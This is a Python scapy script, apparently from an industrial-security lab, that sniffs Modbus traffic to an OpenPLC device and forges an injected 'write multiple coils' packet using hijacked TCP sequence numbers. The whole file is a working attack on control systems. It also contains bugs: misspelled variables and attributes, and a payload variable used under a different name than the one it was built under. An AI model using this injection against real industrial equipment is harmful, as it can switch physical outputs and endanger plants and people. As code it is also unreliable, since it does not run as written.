from scapy.all import *  

flag = 1

while flag:
    OPENPLC_FRAMES = sniff(iface=your_iface, count=4, 
                           lfilter=lambda x: IP in x and x[IP].dest == vicim_ip)
    OPENPLC_WRITE_COILS_QUERY = OPENPLC_FRAMES[2]
    OPEN_PLC_WRITE_COILS_ACK= OPENPLC_FRAMES[3]

    try:
        if "x0f\\x00\\x00\\x00\\x05\\x01" in str(OPENPLC_WRITE_COILS_QUERY[raw].load):
            print("endo of communication loop (write multiple coils) detected")
            flag=0
    except:
        flag=1

print("crafting packet")
tcpddata = {
    'src': OPENPLC_WRITE_COILS_QUERY[IP].src,
    'dst': OPENPLC_WRITE_COILS_QUERY[IP].dst,
    'sport': OPENPLC_WRITE_COILS_QUERY[TCP].sport,
    'dport': OPENPLC_WRITE_COILS_QUERY[TCP].dport,
    'seq': OPENPLC_WRITE_COILS_QUERY[TCP].seq,
    'ack': OPENPLC_WRITE_COILS_QUERY[TCP].ack,
    'wnd': OPENPLC_WRITE_COILS_QUERY[TCP].window
}

payload = IP(src=tcpddata['src'], dst=tcpddata['dst']) / \
             TCP(sport=tcpddata['sport'], dport=tcpddata['dport'],
                 flags="PA", window=tcpddata['wnd'], seq=tcpddata['seq'], ack=tcpddata['ack'])


Transaction_ID=1337
Unit_ID=1
Bit_Count=5
Byte_Count=1
MBFunction = 15
data = 0

class ModbusTCP(Packet):
    name = "mbtcp"
    fields_desc = [
        ShortField("Transaction_ID", Transaction_ID),
        ShortField("Protocol_ID", 0),
        ShortField("Length", 8),
        ByteField("Unit_ID", Unit_ID),

    ]

class Modbus(Packet):
    name = "modbus"
    fields_desc = [
        ByteField("MBFunction", MBFunction),
        ShortField("Reference Number", 0),
        ShortField("Bit Count", Bit_Count),
        ByteField("Byte Count", Byte_Count),
        BitField("data", data)
    ]

PAYLOAD = PAYLOAD/ModbusTCP()/Modbus()
print("Injecting packet...")

send(PAYLOAD, iface=your_iface, verbose=0)

print("Packet injected successfully!")
PAYLOAD.display()